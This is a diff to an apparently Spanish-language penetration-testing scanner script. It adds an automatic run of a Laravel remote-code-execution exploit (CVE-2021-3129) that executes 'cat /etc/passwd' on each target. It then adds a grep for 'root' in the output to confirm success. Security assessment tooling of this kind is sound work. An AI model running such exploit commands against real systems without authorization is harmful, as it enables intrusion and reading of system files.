@@ -687,7 +687,7 @@ function enumeracionCMS () {
 
 		echo -e "\t\t[+] nuclei laravel ("$proto_http"://"$host":"$port")"
 		nuclei -u "$proto_http://$host:$port"  -id /root/.local/nuclei-templates/cves/laravel_"$MODE".txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_laravelNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_laravelNuclei.txt &
-    																																	
+    	laravel-rce-CVE-2021-3129.sh "$proto_http://$host:$port" 'cat /etc/passwd' > logs/vulnerabilidades/"$host"_"$port"_laravel-rce-CVE-2021-3129.txt  2>/dev/null																														
     fi
 
 	#######  chamilo  ######
@@ -1722,7 +1722,7 @@ if [[ $webScaneado -eq 1 ]]; then
 			egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_wordpressNuclei.txt > .vulnerabilidades/"$host"_"$port"_wordpressNuclei.txt 2>/dev/null
 			egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_drupalNuclei.txt > .vulnerabilidades/"$host"_"$port"_drupalNuclei.txt 2>/dev/null
 			egrep --color=never '\[medium\]|\[high\]|\[critical\]' logs/vulnerabilidades/"$host"_"$port"_laravelNuclei.txt > .vulnerabilidades/"$host"_"$port"_laravelNuclei.txt 2>/dev/null
-
+			grep root logs/vulnerabilidades/"$host"_"$port"_laravel-rce-CVE-2021-3129.txt > .vulnerabilidades/"$host"_"$port"_laravel-rce-CVE-2021-3129.txt 2>/dev/null
 			cat logs/vulnerabilidades/"$host"_"$port"_droopescan.txt > .enumeracion/"$host"_"$port"_droopescan.txt	2>/dev/null 		
 			cat logs/vulnerabilidades/"$host"_"$port"_wpUsers.json 2>/dev/null  | wpscan-parser.py   2>/dev/null | awk {'print $2'} > logs/vulnerabilidades/"$host"_"$port"_wpUsers.txt 2>/dev/null
 
